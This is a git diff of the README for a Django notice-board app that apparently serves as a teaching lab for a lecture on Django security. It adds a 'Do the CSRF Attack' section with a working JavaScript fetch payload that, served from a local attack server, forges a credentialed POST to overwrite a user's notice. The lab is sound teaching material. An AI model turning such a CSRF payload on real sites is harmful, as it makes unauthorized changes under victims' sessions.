@@ -3,20 +3,29 @@
 ## Table of Contents
 
 1. [Overview](#overview)
+    - [Demonstration Video](#demonstration)
 2. [Installation](#installation)
-3. [Attack the application](#attack-the-application)
+    - [Prerequisites](#prerequisites)
+    - [Cloning the Repository](#cloning-the-repository)
+    - [Run the application](#run-the-application)
+    - [Sample users](#sample-users)
+    - [Stop the application](#stop-the-application)
+3. [Do the CSRF Attack](#do-the-csrf-attack)
+    - [Demonstration Video](#demonstration)
 4. [Features](#features)
+    - [Functional Requirements](#functional-requeriments)
+    - [Non-functional Requirements](#non-functional-requirements)
 5. [What have I learned?](#what-have-i-learned)
 
 ## Overview
 
-board is a minimalist notice board built using [HTML](https://developer.mozilla.org/en-US/docs/Web/HTML), [Tailwind CSS](https://tailwindcss.com/), [Django](https://www.djangoproject.com/), [MySQL](https://www.mysql.com/) and [Docker](https://www.docker.com/). 
+board is a minimalist notice board built using [HTML](https://developer.mozilla.org/en-US/docs/Web/HTML), [Tailwind CSS](https://tailwindcss.com/), [Django](https://www.djangoproject.com/), [MySQL](https://www.mysql.com/), [phpMyAdmin](https://www.phpmyadmin.net/) and [Docker](https://www.docker.com/). 
 
-This web application was used to give a lecture on the operation of Django and its security mechanisms. This lecture covers topics such as user authentication, URL protection, Middleware, CORS and CSRF Attack and Defense strategies.
+This web application was used to give a lecture on the operation of Django and its security mechanisms. This lecture covers topics such as user authentication, URL protection, Middleware, CORS and CSRF Attack/Defense strategies.
 
-### Demonstration of the application
+### Demonstration
 
-<video src="https://github.com/antonioalanxs/board/assets/79718376/a3d8ddd6-486b-4007-bb52-db1aba3a1e6f" alt="Demonstration"></video>
+<video src="https://github.com/antonioalanxs/board/assets/79718376/a3d8ddd6-486b-4007-bb52-db1aba3a1e6f" alt="Application Video Demonstration"></video>
 
 ## Installation
 
@@ -37,7 +46,8 @@ cd board
 cd docker
 docker compose up --build
 ```
-The application is now running on your [localhost:8000](http://localhost:8000).
+
+The application is now running on your [localhost:8000](http://localhost:8000). Additionally, phpMyAdmin is running on your [localhost:8080](http://localhost:8080) with credentials `user` and `password`.
 
 ### Sample users
 
@@ -55,30 +65,37 @@ docker compose down
 
 The application was turned off.
 
-## Attack the application
+## Do the CSRF Attack
+
+
 
 1.  [Run the application](#run-the-application) and log in with an [user](#sample-users). This will cause the browser to save its `sessionid`.
   
-2.  Select the `slug` of the notice that you want to edit attacking it. You can do this using [phpMyAdmin](http://localhost:8080) or by looking at the notice URL.
+2.  Select the `slug` of the user's notice that you want to edit attacking it. You can do this using [phpMyAdmin](http://localhost:8080) or by looking at the notice URL.
 
-3.  Change current working directory to `attack-server` and Run Attack Server (e.g., `python -m http.server 5000`).
+3.  Change current working directory to `attack-server` and Run Attack Server on [localhost:5500](http://localhost:5500) (e.g., `python -m http.server 5500`).
 
-4.  The Attack Server will edit the notice by fetching its URL including the necessary cookies (stored in the browser previously when logging in, `sessionid`) so that the request is not denied.
-```javascript
-const slug = "3e2e62cf-35f2-4d8e-9244-8649a4748c52" // Example notice slug
+4.  Go to [localhost:5500](http://localhost:5500) and the Attack Server will execute the following code:
 
-fetch(`http://localhost:8000/update/${slug}`, {
-    method: "POST",
-    credentials: "include",
-    headers: {
-        "Content-Type": "application/x-www-form-urlencoded",
-    },
-    body: "title=attacker&content=attacker"
-})
-    .then(res => res.text())
-    .then(text => console.log(text))
-    .catch(err => console.error(err));
-```
+    ```javascript
+    const slug = "3e2e62cf-35f2-4d8e-9244-8649a4748c52" // Example user's notice slug
+    
+    fetch(`http://localhost:8000/update/${slug}`, {
+        method: "POST",
+        credentials: "include", // sessionid Cookie stored in the browser previously when logging in the application
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded",
+        },
+        body: "title=attacker&content=attacker"
+    })
+        .then(res => res.text())
+        .then(text => console.log(text))
+        .catch(err => console.error(err));
+    ```
+
+### Demonstration
+
+<video src="https://github.com/antonioalanxs/board/assets/79718376/7194f1a5-bd2e-4bb7-8920-38da6725c05f" alt="Attack Video Demonstration"></video>
 
 ## Features
 
